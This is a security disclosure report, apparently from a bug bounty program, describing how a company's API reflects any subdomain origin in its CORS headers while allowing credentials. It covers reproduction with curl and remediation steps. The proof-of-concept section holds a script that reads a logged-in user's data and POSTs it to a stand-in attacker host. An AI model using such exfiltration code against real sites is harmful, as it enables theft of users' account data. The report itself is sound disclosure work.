# Overly-permissive credentialed CORS — MyConfigura API reflects any `*.configura.com` origin

**Program:** Configura Security Bug Bounty Program (Xposera)
**Scope:** `*.configura.com` (in scope)
**Affected asset:** `https://www2.configura.com/api/v3` (MyConfigura backend API)
**Severity:** Medium — **CVSS 3.1 6.5** (`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N`)
**Weakness:** CWE-942 — Permissive Cross-domain Policy with Untrusted Domains
**Date:** 2026-10-07

---

## Summary

The MyConfigura backend API at `https://www2.configura.com/api/v3` builds its CORS response by
**reflecting the request `Origin` header** whenever that origin is any `*.configura.com` host, and
it returns `Access-Control-Allow-Credentials: true`. Session authentication uses cookies scoped to
the parent domain `.configura.com`.

Because the trust boundary is "any subdomain of configura.com" rather than an explicit list of
trusted front-ends, **any** web page running on **any** `*.configura.com` origin can send
credentialed cross-origin requests to the API and **read the responses** — i.e. act as the
logged-in user and read their account data.

## Steps to reproduce

Send a request to any API endpoint with an arbitrary `*.configura.com` `Origin` header and observe
that it is reflected together with `Access-Control-Allow-Credentials: true`:

```
$ curl -s -D- -o /dev/null -H 'Origin: https://public-dev.configura.com' \
       https://www2.configura.com/api/v3/user/get-logged-in
HTTP/2 401
access-control-allow-credentials: true
access-control-allow-origin: https://public-dev.configura.com      # <-- reflected verbatim

$ curl -s -D- -o /dev/null -H 'Origin: https://takenover.configura.com' \
       https://www2.configura.com/api/v3/user/get-logged-in
access-control-allow-credentials: true
access-control-allow-origin: https://takenover.configura.com       # <-- any subdomain reflected
```

An unrelated origin (e.g. `https://evil.attacker.com`) is **not** reflected, confirming the server
is matching on the `*.configura.com` suffix rather than echoing all origins — but the entire
`*.configura.com` space is still far too broad for a credentialed, data-bearing API.

## Proof of concept (impact)

An attacker who controls **one** `*.configura.com` origin hosts the following and lures a
logged-in MyConfigura user to visit it:

```html
<script>
fetch('https://www2.configura.com/api/v3/user/get-logged-in', { credentials: 'include' })
  .then(r => r.json())
  .then(d => fetch('https://attacker.example/collect', { method:'POST', body: JSON.stringify(d) }));
// repeat for briefcases/list, projects, license-administration/*, customer/*, etc.
</script>
```

The victim's `.configura.com`-scoped session cookies are sent with the cross-origin request; the
reflected-origin + `Allow-Credentials: true` response lets the attacker's page **read the
response** and exfiltrate the victim's data (briefcases, projects, licenses, customers) and act as
them.

### Precondition
The attacker needs a foothold on some `*.configura.com` origin. That can be obtained via:
- an XSS / HTML-injection on any Configura subdomain (several subdomains host custom apps), or
- a subdomain takeover of any `*.configura.com` host.

This precondition is why the rating is **Medium** rather than High. The CORS policy should still be
fixed, because it converts *any* such sibling-origin foothold into full disclosure of a user's
MyConfigura account data.

## Impact

- Cross-origin, credentialed read of a logged-in user's MyConfigura data from any attacker-held
  `*.configura.com` origin.
- Ability to invoke state-changing API actions as the victim (the CSRF token is likewise readable
  from a sibling origin's context in a full chain).

## Remediation

- Replace `Origin` reflection with an explicit allow-list of the exact origins that legitimately
  need credentialed access (for example `https://app.configura.com`, `https://stage.configura.com`).
- Never combine `Access-Control-Allow-Credentials: true` with a broadly matched / reflected origin.
- Treat subdomains as untrusted for credentialed CORS; a single compromised or taken-over subdomain
  should not be able to read authenticated API responses.

## Notes
Verified by header inspection only; no authenticated user data was accessed. In-scope
`*.configura.com` testing.
